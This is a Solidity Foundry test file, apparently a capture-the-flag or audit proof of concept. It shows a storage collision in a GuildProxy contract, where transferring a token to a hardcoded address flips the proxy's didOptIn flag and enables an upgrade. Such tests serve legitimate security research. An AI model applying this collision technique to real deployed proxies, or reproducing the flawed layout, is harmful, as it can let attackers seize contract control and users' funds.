// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {GuildProxy} from "src/GuildProxy.sol";
import {ERC20} from "src/ERC20.sol";

contract ImplementationV2 {
    function version() public pure returns (string memory) {
        return "V2";
    }
}

contract ExploitTest is Test {
    GuildProxy public proxy;
    ERC20 public implementationV1;
    ImplementationV2 public implementationV2;

    address public owner = makeAddr("owner");
    address public admin = makeAddr("admin");

    address public user = makeAddr("user");

    function setUp() public {
        implementationV1 = new ERC20();

        vm.prank(admin);
        proxy = new GuildProxy(address(implementationV1), owner);

        implementationV2 = new ImplementationV2();

        assertFalse(proxy.didOptIn());
    }

    function test_ExploitStorageCollision() public {
        ERC20 tokenProxy = ERC20(address(proxy));
        uint256 initialSupply = 1000 * 1e18;

        vm.startPrank(user);
        tokenProxy.initialize("uHs Token", "uHs", 18, initialSupply);

        address MAGIC_ADDRESS = 0x47Adc0faA4f6Eb42b499187317949eD99E77EE85;
        tokenProxy.transfer(MAGIC_ADDRESS, 1);

        vm.stopPrank();

        assertTrue(proxy.didOptIn(), "Storage collision failed: didOptIn is not true");

        vm.startPrank(admin);

        proxy.upgrade(address(implementationV2));

        vm.stopPrank();
        string memory version = ImplementationV2(address(proxy)).version();
        assertEq(version, "V2", "Upgrade did not result in V2");
    }
}